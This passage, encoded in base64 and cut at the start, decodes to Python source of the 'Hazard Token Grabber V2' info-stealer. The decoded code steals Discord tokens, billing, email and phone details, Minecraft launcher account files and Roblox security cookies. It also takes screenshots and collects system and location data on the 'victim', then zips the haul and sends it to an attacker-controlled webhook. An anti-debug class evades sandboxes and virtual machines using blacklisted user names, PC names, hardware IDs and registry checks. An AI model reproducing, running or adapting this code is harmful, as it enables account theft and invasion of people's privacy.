pc2NvcmRBcGkgKyAiL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1zZWxmLmdldF9oZWFkZXJzKHRva2VuKSkudGV4dCkpID4gMCkKICAgICAgICAgICAgZi53cml0ZShmInsnICcqMTd9e3VzZXJ9XG57Jy0nKjUwfVxuVG9rZW46IHt0b2tlbn1cbkhhcyBCaWxsaW5nOiB7YmlsbGluZ31cbk5pdHJvOiB7aGFzX25pdHJvfVxuQmFkZ2VzOiB7YmFkZ2VzfVxuRW1haWw6IHtlbWFpbH1cblBob25lOiB7cGhvbmV9XG5cbiIpCiAgICAgICAgZi5jbG9zZSgpCgogICAgZGVmIGdyYWJNaW5lY3JhZnRDYWNoZShzZWxmKToKICAgICAgICBtaW5lY3JhZnQgPSBudHBhdGguam9pbihzZWxmLmRpciwgJ01pbmVjcmFmdCcpCiAgICAgICAgb3MubWFrZWRpcnMobWluZWNyYWZ0LCBleGlzdF9vaz1UcnVlKQogICAgICAgIG1jID0gbnRwYXRoLmpvaW4oc2VsZi5yb2FtaW5nLCAnLm1pbmVjcmFmdCcpCiAgICAgICAgdG9fZ3JhYiA9IFsnbGF1bmNoZXJfYWNjb3VudHMuanNvbicsICdsYXVuY2hlcl9wcm9maWxlcy5qc29uJywgJ3VzZXJjYWNoZS5qc29uJywgJ2xhdW5jaGVyX2xvZy50eHQnXQoKICAgICAgICBmb3IgX2ZpbGUgaW4gdG9fZ3JhYjoKICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhudHBhdGguam9pbihtYywgX2ZpbGUpKToKICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5MihudHBhdGguam9pbihtYywgX2ZpbGUpLCBtaW5lY3JhZnQgKyBzZWxmLnNlcCArIF9maWxlKQoKICAgIGRlZiBncmFiUm9ibG94Q29va2llKHNlbGYpOgogICAgICAgIGRlZiBzdWJwcm9jKHBhdGgpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXR1cm4gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoCiAgICAgICAgICAgICAgICAgICAgZnIicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGgge3BhdGh9OlNPRlRXQVJFXFJvYmxveFxSb2Jsb3hTdHVkaW9Ccm93c2VyXHJvYmxveC5jb20gLU5hbWUgLlJPQkxPU0VDVVJJVFkiLAogICAgICAgICAgICAgICAgICAgIGNyZWF0aW9uZmxhZ3M9MHgwODAwMDAwMCkuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgcmVnX2Nvb2tpZSA9IHN1YnByb2MocidIS0xNJykKICAgICAgICBpZiBub3QgcmVnX2Nvb2tpZToKICAgICAgICAgICAgcmVnX2Nvb2tpZSA9IHN1YnByb2MocidIS0NVJykKICAgICAgICBpZiByZWdfY29va2llOgogICAgICAgICAgICBzZWxmLnJvYmxveGNvb2tpZXMuYXBwZW5kKHJlZ19jb29raWUpCiAgICAgICAgaWYgc2VsZi5yb2Jsb3hjb29raWVzOgogICAgICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIgKyAiXFxSb2Jsb3ggQ29va2llcy50eHQiLCAidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLnJvYmxveGNvb2tpZXM6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShpICsgJ1xuJykKCiAgICBkZWYgc2NyZWVuc2hvdChzZWxmKToKICAgICAgICBpbWFnZSA9IEltYWdlR3JhYi5ncmFiKAogICAgICAgICAgICBiYm94PU5vbmUsCiAgICAgICAgICAgIGluY2x1ZGVfbGF5ZXJlZF93aW5kb3dzPUZhbHNlLAogICAgICAgICAgICBhbGxfc2NyZWVucz1UcnVlLAogICAgICAgICAgICB4ZGlzcGxheT1Ob25lCiAgICAgICAgKQogICAgICAgIGltYWdlLnNhdmUoc2VsZi5kaXIgKyAiXFxTY3JlZW5zaG90LnBuZyIpCiAgICAgICAgaW1hZ2UuY2xvc2UoKQoKICAgIGRlZiBzeXNfZHVtcChzZWxmKToKICAgICAgICBsaW5lX3NlcCA9ICI9IiAqIDUwCiAgICAgICAgYWJvdXQgPSBmIiIiCntsaW5lX3NlcH0Ke1ZpY3RpbX0gfCB7VmljdGltX3BjfQp7bGluZV9zZXB9CldpbmRvd3Mga2V5OiB7c2VsZi53aW5rZXl9CldpbmRvd3MgdmVyc2lvbjoge3NlbGYud2ludmVyfQp7bGluZV9zZXB9ClJBTToge3JhbX1HQgpESVNLOiB7ZGlza31HQgpIV0lEOiB7c2VsZi5od2lkfQp7bGluZV9zZXB9CklQOiB7c2VsZi5pcH0KQ2l0eToge3NlbGYuY2l0eX0KQ291bnRyeToge3NlbGYuY291bnRyeX0KUmVnaW9uOiB7c2VsZi5yZWdpb259Ck9yZzoge3NlbGYub3JnfQpHb29nbGVNYXBzOiB7c2VsZi5nb29nbGVtYXB9CntsaW5lX3NlcH0KICAgICAgICAiIiIKICAgICAgICB3aXRoIG9wZW4oc2VsZi5kaXIgKyAiXFxTeXN0ZW0gaW5mby50eHQiLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0naWdub3JlJykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShhYm91dCkKCiAgICBkZWYgZmluaXNoKHNlbGYpOgogICAgICAgIGZvciBpIGluIG9zLmxpc3RkaXIoc2VsZi5kaXIpOgogICAgICAgICAgICBpZiBpLmVuZHN3aXRoKCcudHh0Jyk6CiAgICAgICAgICAgICAgICBwYXRoID0gc2VsZi5kaXIgKyBzZWxmLnNlcCArIGkKICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVycm9ycz0iaWdub3JlIikgYXMgZmY6CiAgICAgICAgICAgICAgICAgICAgeCA9IGZmLnJlYWQoKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCB4OgogICAgICAgICAgICAgICAgICAgICAgICBmZi5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoLCAidyIsIGVuY29kaW5nPSJ1dGYtOCIsIGVycm9ycz0iaWdub3JlIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoIvCfjJ/jg7tHcmFiYmVyIEJ5IGdpdGh1Yi5jb20vUmRpbW/jg7todHRwczovL2dpdGh1Yi5jb20vUmRpbW8vSGF6YXJkLVRva2VuLUdyYWJiZXItVjJcblxuIikKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJhIiwgZW5jb2Rpbmc9InV0Zi04IiwgZXJyb3JzPSJpZ25vcmUiKSBhcyBmcDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZwLndyaXRlKHggKyAiXG5cbvCfjJ/jg7tHcmFiYmVyIEJ5IGdpdGh1Yi5jb20vUmRpbW/jg7todHRwczovL2dpdGh1Yi5jb20vUmRpbW8vSGF6YXJkLVRva2VuLUdyYWJiZXItVjIiKQoKICAgICAgICBfemlwZmlsZSA9IG50cGF0aC5qb2luKHNlbGYuYXBwZGF0YSwgZidIYXphcmQuVjItW3tWaWN0aW19XS56aXAnKQogICAgICAgIHppcHBlZF9maWxlID0gemlwZmlsZS5aaXBGaWxlKF96aXBmaWxlLCAidyIsIHppcGZpbGUuWklQX0RFRkxBVEVEKQogICAgICAgIGFic19zcmMgPSBudHBhdGguYWJzcGF0aChzZWxmLmRpcikKICAgICAgICBmb3IgZGlybmFtZSwgXywgZmlsZXMgaW4gb3Mud2FsayhzZWxmLmRpcik6CiAgICAgICAgICAgIGZvciBmaWxlbmFtZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGFic25hbWUgPSBudHBhdGguYWJzcGF0aChudHBhdGguam9pbihkaXJuYW1lLCBmaWxlbmFtZSkpCiAgICAgICAgICAgICAgICBhcmNuYW1lID0gYWJzbmFtZVtsZW4oYWJzX3NyYykgKyAxOl0KICAgICAgICAgICAgICAgIHppcHBlZF9maWxlLndyaXRlKGFic25hbWUsIGFyY25hbWUpCiAgICAgICAgemlwcGVkX2ZpbGUuY2xvc2UoKQoKICAgICAgICBmaWxlX2NvdW50LCBmaWxlc19mb3VuZCwgdG9rZW5zID0gMCwgJycsICcnCiAgICAgICAgZm9yIF8sIF9fLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuZGlyKToKICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgZmlsZXNfZm91bmQgKz0gZiLjg7t7X2ZpbGV9XG4iCiAgICAgICAgICAgICAgICBmaWxlX2NvdW50ICs9IDEKICAgICAgICBmb3IgdGtuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICB0b2tlbnMgKz0gZid7dGtufVxuXG4nCiAgICAgICAgZmlsZUNvdW50ID0gZiJ7ZmlsZV9jb3VudH0gRmlsZXMgRm91bmQ6ICIKCiAgICAgICAgZW1iZWQgPSB7CiAgICAgICAgICAgICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SZGltby9pbWFnZXMvbWFzdGVyL0hhemFyZC1Ub2tlbi1HcmFiYmVyLVYyL0JpZ19oYXphcmQuZ2lmJywKICAgICAgICAgICAgJ2VtYmVkcyc6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAnYXV0aG9yJzogewogICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IGYnKntWaWN0aW19KiBKdXN0IHJhbiBIYXphcmQgVG9rZW4gR3JhYmJlci5WMicsCiAgICAgICAgICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9naXRodWIuY29tL1JkaW1vL0hhemFyZC1Ub2tlbi1HcmFiYmVyLVYyJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2ljb25fdXJsJzogJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SZGltby9pbWFnZXMvbWFzdGVyL0hhemFyZC1Ub2tlbi1HcmFiYmVyLVYyL1NtYWxsX2hhemFyZC5naWYnCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAnY29sb3InOiAxNzYxODUsCiAgICAgICAgICAgICAgICAgICAgJ2Rlc2NyaXB0aW9uJzogZidbR29vZ2xlIE1hcHMgTG9jYXRpb25dKHtzZWxmLmdvb2dsZW1hcH0pJywKICAgICAgICAgICAgICAgICAgICAnZmllbGRzJzogWwogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICdcdTIwMGInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGZpeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElQOuGgjuKAr3tzZWxmLmlwLnJlcGxhY2UoIiAiLCAi4aCO4oCvIikgaWYgc2VsZi5pcCBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9yZzrhoI7igK97c2VsZi5vcmcucmVwbGFjZSgiICIsICLhoI7igK8iKSBpZiBzZWxmLm9yZyBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENpdHk64aCO4oCve3NlbGYuY2l0eS5yZXBsYWNlKCIgIiwgIuGgjuKAryIpIGlmIHNlbGYuY2l0eSBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlZ2lvbjrhoI7igK97c2VsZi5yZWdpb24ucmVwbGFjZSgiICIsICLhoI7igK8iKSBpZiBzZWxmLnJlZ2lvbiBlbHNlICJOL0EifQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvdW50cnk64aCO4oCve3NlbGYuY291bnRyeS5yZXBsYWNlKCIgIiwgIuGgjuKAryIpIGlmIHNlbGYuY291bnRyeSBlbHNlICJOL0EifWBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICdcdTIwMGInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGZpeAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTmFtZTrigK97VmljdGltX3BjLnJlcGxhY2UoIiAiLCAi4aCO4oCvIil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2luS2V5OuGgjuKAr3tzZWxmLndpbmtleS5yZXBsYWNlKCIgIiwgIuGgjuKAryIpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdpblZlcjrhoI7igK97c2VsZi53aW52ZXIucmVwbGFjZSgiICIsICLhoI7igK8iKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNrU3BhY2U64aCO4oCve2Rpc2t9R0IKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYW064aCO4oCve3JhbX1HQmBgYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJycnLnJlcGxhY2UoJyAnLCAnJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5saW5lJzogVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6ICcqKlRva2VuczoqKicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBmJycnYGBgeWFtbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHt0b2tlbnMgaWYgdG9rZW5zIGVsc2UgIk5v4oCvdG9rZW5z4oCvZXh0cmFjdGVkIn1gYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcnJy5yZXBsYWNlKCcgJywgJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogZmlsZUNvdW50LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGluaQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7ZmlsZXNfZm91bmQuc3RyaXAoKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdYGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycucmVwbGFjZSgnICcsICcnKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOiBGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICAnZm9vdGVyJzogewogICAgICAgICAgICAgICAgICAgICAgICAndGV4dCc6ICfwn4yf44O7R3JhYmJlciBCeSBnaXRodWIuY29tL1JkaW1v44O7aHR0cHM6Ly9naXRodWIuY29tL1JkaW1vL0hhemFyZC1Ub2tlbi1HcmFiYmVyLVYyJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXQogICAgICAgIH0KICAgICAgICBpZiBzZWxmLmZldGNoX2NvbmYoJ3Bpbmdfb25fcnVuJyk6CiAgICAgICAgICAgIGVtYmVkLnVwZGF0ZSh7J2NvbnRlbnQnOiAnQGV2ZXJ5b25lJ30pCgogICAgICAgIHdpdGggb3BlbihfemlwZmlsZSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgaWYgc2VsZi5ob29rX3JlZyBpbiBzZWxmLndlYmhvb2s6CiAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYud2ViaG9vaywganNvbj1lbWJlZCkKICAgICAgICAgICAgICAgIGh0dHB4LnBvc3Qoc2VsZi53ZWJob29rLCBmaWxlcz17J3VwbG9hZF9maWxlJzogZn0pCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBmcm9tIHB5b3RwIGltcG9ydCBUT1RQCiAgICAgICAgICAgICAgICBrZXkgPSBUT1RQKHNlbGYuZmV0Y2hfY29uZignd2ViaG9va19wcm90ZWN0b3Jfa2V5JykpLm5vdygpCiAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYud2ViaG9vaywgaGVhZGVycz17IkF1dGhvcml6YXRpb24iOiBrZXl9LCBqc29uPWVtYmVkKQogICAgICAgICAgICAgICAgaHR0cHgucG9zdChzZWxmLndlYmhvb2ssIGhlYWRlcnM9eyJBdXRob3JpemF0aW9uIjoga2V5fSwgZmlsZXM9eyd1cGxvYWRfZmlsZSc6IGZ9KQogICAgICAgIG9zLnJlbW92ZShfemlwZmlsZSkKICAgICAgICBzZWxmLmhhemFyZF9leGl0KCkKCgpjbGFzcyBBbnRpRGVidWcoRnVuY3Rpb25zKToKICAgIGluVk0gPSBGYWxzZQoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLnByb2Nlc3NlcyA9IGxpc3QoKQoKICAgICAgICBzZWxmLmJsYWNrTGlzdGVkVXNlcnMgPSBbCiAgICAgICAgICAgICJXREFHVXRpbGl0eUFjY291bnQiLCAiQWJieSIsICJQZXRlciBXaWxzb24iLCAiaG1hcmMiLCAicGF0ZXgiLCAiSk9ITi1QQyIsICJSRGhKMENORmV2elgiLCAia0VlY2ZNd2dqIiwgIkZyYW5rIiwgIjhObDBDb2xOUTVicSIsCiAgICAgICAgICAgICJMaXNhIiwgIkpvaG4iLCAiZ2VvcmdlIiwgIlB4bWRVT3BWeXgiLCAiOFZpelNNIiwgIncwZmp1T1ZtQ2NQNUEiLCAibG1Wd2pqOWIiLCAiUHFPTmpIVndleHNTIiwgIjN1MnY5bTgiLCAiSnVsaWEiLCAiSEVVZVJ6bCIsCiAgICAgICAgXQogICAgICAgIHNlbGYuYmxhY2tMaXN0ZWRQQ05hbWVzID0gWwogICAgICAgICAgICAiQkVFNzM3MEMtOEMwQy00IiwgIkRFU0tUT1AtTkFLRkZNVCIsICJXSU4tNUUwN0NPUzlBTFIiLCAiQjMwRjAyNDItMUM2QS00IiwgIkRFU0tUT1AtVlJTUUxBRyIsICJROUlBVFJLUFJIIiwgIlhDNjRaQiIsICJERVNLVE9QLUQwMTlHRE0iLAogICAgICAgICAgICAiREVTS1RPUC1XSThDTEVUIiwgIlNFUlZFUjEiLCAiTElTQS1QQyIsICJKT0hOLVBDIiwgIkRFU0tUT1AtQjBUOTNENiIsICJERVNLVE9QLTFQWUtQMjkiLCAiREVTS1RPUC0xWTI0MzNSIiwgIldJTEVZUEMiLCAiV09SSyIsICI2QzRFNzMzRi1DMkQ5LTQiLAogICAgICAgICAgICAiUkFMUEhTLVBDIiwgIkRFU0tUT1AtV0czTVlKUyIsICJERVNLVE9QLTdYQzZHRVoiLCAiREVTS1RPUC01T1Y5UzBPIiwgIlFhclpocmRCcGoiLCAiT1JFTEVFUEMiLCAiQVJDSElCQUxEUEMiLCAiSlVMSUEtUEMiLCAiZDFibkprZlZsSCIsCiAgICAgICAgXQogICAgICAgIHNlbGYuYmxhY2tMaXN0ZWRIV0lEUyA9IFsKICAgICAgICAgICAgIjdBQjVDNDk0LTM5RjUtNDk0MS05MTYzLTQ3RjU0RDZENTAxNiIsICIwMzJFMDJCNC0wNDk5LTA1QzMtMDgwNi0zQzA3MDAwODAwMDkiLCAiMDNERTAyOTQtMDQ4MC0wNURFLTFBMDYtMzUwNzAwMDgwMDA5IiwKICAgICAgICAgICAgIjExMTExMTExLTIyMjItMzMzMy00NDQ0LTU1NTU1NTU1NTU1NSIsICI2RjNDQTVFQy1CRUM5LTRBNEQtODI3NC0xMTE2OEY2NDAwNTgiLCAiQURFRUVFOUUtRUYwQS02Qjg0LUIxNEItQjgzQTU0QUZDNTQ4IiwKICAgICAgICAgICAgIjRDNEM0NTQ0LTAwNTAtMzcxMC04MDU4LUNBQzA0RjU5MzQ0QSIsICIwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC1BQzFGNkJEMDQ5NzIiLCAiNzlBRjUyNzktMTZDRi00MDk0LTk3NTgtRjg4QTYxNkQ4MUI0IiwKICAgICAgICAgICAgIjVCRDI0RDU2LTc4OUYtODQ2OC03Q0RDLUNBQTcyMjJDQzEyMSIsICI0OTQzNEQ1My0wMjAwLTkwNjUtMjUwMC02NTkwMjUwMEU0MzkiLCAiNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDBGMDIyIiwKICAgICAgICAgICAgIjc3N0Q4NEIzLTg4RDEtNDUxQy05M0U0LUQyMzUxNzc0MjBBNyIsICI0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMDBDNjUiLCAiQjExMTIwNDItNTJFOC1FMjVCLTM2NTUtNkE0RjU0MTU1REJGIiwKICAgICAgICAgICAgIjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLUFDMUY2QkQwNDhGRSIsICJFQjE2OTI0Qi1GQjZELTRGQTEtODY2Ni0xN0I5MUY2MkZCMzciLCAiQTE1QTkzMEMtODI1MS05NjQ1LUFGNjMtRTQ1QUQ3MjhDMjBDIiwKICAgICAgICAgICAgIjY3RTU5NUVCLTU0QUMtNEZGMC1CNUUzLTNEQTdDN0I1NDdFMyIsICJDN0QyMzM0Mi1BNUQ0LTY4QTEtNTlBQy1DRjQwRjczNUIzNjMiLCAiNjMyMDMzNDItMEVCMC1BQTFBLTRERjUtM0ZCMzdEQkIwNjcwIiwKICAgICAgICAgICAgIjQ0Qjk0RDU2LTY1QUItREMwMi04NkEwLTk4MTQzQTc0MjNCRiIsICI2NjA4MDAzRi1FQ0U0LTQ5NEUtQjA3RS0xQzQ2MTVEMUQ5M0MiLCAiRDkxNDIwNDItOEY1MS01RUZGLUQ1RjgtRUU5QUUzRDE2MDJBIiwKICAgICAgICAgICAgIjQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwM0FGMCIsICI4QjRFODI3OC01MjVDLTczNDMtQjgyNS0yODBBRUJDRDNCQ0IiLCAiNEQ0RERDOTQtRTA2Qy00NEY0LTk1RkUtMzNBMUFEQTVBQzI3IiwKICAgICAgICBdCgogICAgICAgIGZvciBmdW5jIGluIFtzZWxmLmxpc3RDaGVjaywgc2VsZi5yZWdpc3RyeUNoZWNrLCBzZWxmLnNwZWNzQ2hlY2tdOgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHNlbGYucHJvY2Vzc2VzLmFwcGVuZChwcm9jZXNzKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiBzZWxmLnByb2Nlc3NlczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgZGVmIHByb2dyYW1FeGl0KHNlbGYpOgogICAgICAgIHNlbGYuX19jbGFzc19fLmluVk0gPSBUcnVlCgogICAgZGVmIGxpc3RDaGVjayhzZWxmKToKICAgICAgICBmb3IgcGF0aCBpbiBbcidEOlxUb29scycsIHInRDpcT1MyJywgcidEOlxOVDNYJ106CiAgICAgICAgICAgIGlmIG50cGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgZm9yIHVzZXIgaW4gc2VsZi5ibGFja0xpc3RlZFVzZXJzOgogICAgICAgICAgICBpZiBWaWN0aW0gPT0gdXNlcjoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBmb3IgcGNOYW1lIGluIHNlbGYuYmxhY2tMaXN0ZWRQQ05hbWVzOgogICAgICAgICAgICBpZiBWaWN0aW1fcGMgPT0gcGNOYW1lOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciBod2lkIGluIHNlbGYuYmxhY2tMaXN0ZWRIV0lEUzoKICAgICAgICAgICAgaWYgc2VsZi5zeXN0ZW1faW5mbygpWzBdID09IGh3aWQ6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICBkZWYgc3BlY3NDaGVjayhzZWxmKToKICAgICAgICAjIHdvdWxkIG5vdCByZWNvbW1lbmQgY2hhbmdpbmcgdGhpcyB0byBvdmVyIDJnYiBzaW5jZSBzb21lIGFjdHVhbGx5IGhhdmUgM2diIG9mIHJhbQogICAgICAgIGlmIGludChyYW0pIDw9IDI6ICAjIDJnYiBvciBsZXNzIHJhbQogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBpZiBpbnQoZGlzaykgPD0gNTA6ICAjIDUwZ2Igb3IgbGVzcyBkaXNjIHNwYWNlCiAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQogICAgICAgIGlmIGludChwc3V0aWwuY3B1X2NvdW50KCkpIDw9IDE6ICAjIDEgb3IgbGVzcyBjcHUgY29yZXMKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgZGVmIHJlZ2lzdHJ5Q2hlY2soc2VsZik6CiAgICAgICAgcmVnMSA9IG9zLnN5c3RlbSgiUkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXERyaXZlckRlc2MgMj4gbnVsIikKICAgICAgICByZWcyID0gb3Muc3lzdGVtKCJSRUcgUVVFUlkgSEtFWV9MT0NBTF9NQUNISU5FXFxTWVNURU1cXENvbnRyb2xTZXQwMDFcXENvbnRyb2xcXENsYXNzXFx7NEQzNkU5NjgtRTMyNS0xMUNFLUJGQzEtMDgwMDJCRTEwMzE4fVxcMDAwMFxcUHJvdmlkZXJOYW1lIDI+IG51bCIpCiAgICAgICAgaWYgKHJlZzEgYW5kIHJlZzIpICE9IDE6CiAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBoYW5kbGUgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCAnU1lTVEVNXFxDdXJyZW50Q29udHJvbFNldFxcU2VydmljZXNcXERpc2tcXEVudW0nKQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVnX3ZhbCA9IHdpbnJlZy5RdWVyeVZhbHVlRXgoaGFuZGxlLCAnMCcpWzBdCiAgICAgICAgICAgIGlmICgiVk13YXJlIiBvciAiVkJPWCIpIGluIHJlZ192YWw6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICB3aW5yZWcuQ2xvc2VLZXkoaGFuZGxlKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyIgYW5kIG9zLm5hbWUgPT0gIm50IjoKICAgIHRyeToKICAgICAgICBodHRweC5nZXQoJ2h0dHBzOi8vZ29vZ2xlLmNvbScpCiAgICBleGNlcHQgKGh0dHB4Lk5ldHdvcmtFcnJvciwgaHR0cHguVGltZW91dEV4Y2VwdGlvbik6CiAgICAgICAgb3MuX2V4aXQoMCkKICAgIGFzeW5jaW8ucnVuKExvZ0NoZWNraW5nWE8oKS5pbml0KCkp
